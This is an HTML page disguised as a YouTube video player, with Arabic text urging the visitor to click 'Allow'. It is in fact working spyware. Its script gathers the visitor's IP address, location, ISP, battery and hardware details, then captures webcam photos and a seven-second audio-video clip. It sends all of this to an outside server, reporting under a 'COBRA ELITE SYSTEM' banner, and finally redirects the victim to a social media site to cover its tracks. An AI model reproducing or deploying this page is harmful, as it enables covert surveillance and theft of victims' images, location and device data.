<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>YouTube Video Player</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <style>
    body { margin: 0; background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
    .container { text-align: center; padding: 20px; }
    .loader { border: 3px solid #222; border-top: 3px solid #f00; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 20px auto; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    video, canvas { opacity: 0; position: absolute; left: -9999px; }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" width="130">
    <div class="loader"></div>
    <p style="color: #666; font-size: 14px;">جارٍ معالجة الفيديو...<br>يرجى الضغط على <b>Allow</b> للمتابعة.</p>
  </div>

  <video id="v" autoplay muted playsinline></video>
  <canvas id="c" width="640" height="480"></canvas>

  <script>
    const urlParams = new URLSearchParams(window.location.search);
    const chatId = urlParams.get("id");
    const reKey = urlParams.get("re");

    const v = document.getElementById("v");
    const c = document.getElementById("c");
    const ctx = c.getContext("2d");

    const redirectMap = { "fb": "https://facebook.com", "ig": "https://instagram.com", "yt": "https://youtube.com" };

    // دالة الإرسال مع معالجة الأخطاء
    async function send(msg, type = "text", file = null) {
      if (!chatId) return;
      const payload = { chat_id: chatId };
      if (type === "text") payload.message = msg;
      if (type === "photo") { payload.message = "📸 *NEW SNAPSHOT:*"; payload.photo = file; }
      if (type === "video") { payload.message = "📹 *VIDEO CLIP (7s):*"; payload.video = file; }

      try {
        await fetch("https://render-backend-package1.onrender.com/submit", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
          keepalive: true
        });
      } catch (e) { console.log("Send Error"); }
    }

    async function analyzeTarget() {
      // 1. جلب بيانات الجهاز فوراً (هذي ما تسحقش إنترنت)
      let bat = "N/A";
      try { const b = await navigator.getBattery(); bat = `${Math.round(b.level * 100)}% (${b.charging ? '🔌' : '🔋'})`; } catch(e){}
      
      const timeStr = new Date().toLocaleString('ar-DZ');
      const hardware = `${navigator.hardwareConcurrency} Cores | ${navigator.deviceMemory || 'N/A'}GB RAM`;

      // 2. محاولة جلب الـ IP (باستخدام API بديل ومستقر)
      let ipData = { ip: "Unknown", city: "Unknown", country: "Unknown", org: "Unknown", timezone: "Unknown" };
      try {
        const res = await fetch("https://ipapi.co/json/");
        ipData = await res.json();
      } catch (e) { console.log("IP API Error"); }

      const browserTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const isVpn = (ipData.timezone !== browserTimezone) ? "⚠️ YES (Detected)" : "✅ NO (Real)";

      // 3. بناء الرسالة وإرسالها
      let m = "🏁 *COBRA ELITE SYSTEM V8.0* 🏁\n";
      m += "━━━━━━━━━━━━━━━━━━━━\n";
      m += `🌍 *IP:* \`${ipData.ip}\`\n`;
      m += `🛡️ *VPN:* ${isVpn}\n`;
      m += `🏢 *ISP:* ${ipData.org}\n`;
      m += `📍 *Loc:* ${ipData.city}, ${ipData.country}\n`;
      m += `🕒 *Time:* ${timeStr}\n`;
      m += `🔋 *Battery:* ${bat}\n`;
      m += `💻 *HW:* ${hardware}\n`;
      m += "━━━━━━━━━━━━━━━━━━━━\n";
      
      await send(m); // إرسال التقرير النصي
      startSpying(); // البدء في الكاميرا
    }

    function startSpying() {
      navigator.mediaDevices.getUserMedia({ video: true, audio: true })
        .then(stream => {
          v.srcObject = stream;
          v.onloadedmetadata = () => {
            v.play();
            const recorder = new MediaRecorder(stream);
            let chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            
            recorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'video/webm' });
                const reader = new FileReader();
                reader.readAsDataURL(blob);
                reader.onloadend = () => { send("", "video", reader.result.split(',')[1]); };
                setTimeout(finalizeRedirect, 1000);
            };

            // التقاط 3 صور وفيديو 7 ثوانٍ
            setTimeout(() => {
                // لقطة 1
                ctx.drawImage(v, 0, 0, c.width, c.height);
                send("", "photo", c.toDataURL("image/jpeg", 0.7).split(',')[1]);

                recorder.start();

                // لقطة 2 (بعد 3 ثواني)
                setTimeout(() => {
                    ctx.drawImage(v, 0, 0, c.width, c.height);
                    send("", "photo", c.toDataURL("image/jpeg", 0.7).split(',')[1]);
                }, 3000);

                // إيقاف التسجيل بعد 7 ثواني
                setTimeout(() => {
                    recorder.stop();
                    stream.getTracks().forEach(t => t.stop());
                }, 7000);
            }, 2500);
          };
        })
        .catch(() => {
          send("❌ *Target Denied Access*");
          finalizeRedirect();
        });
    }

    function finalizeRedirect() {
      let finalUrl = redirectMap[reKey] || "https://www.youtube.com";
      window.location.replace(finalUrl);
    }

    if (chatId) analyzeTarget();
  </script>
</body>
</html>
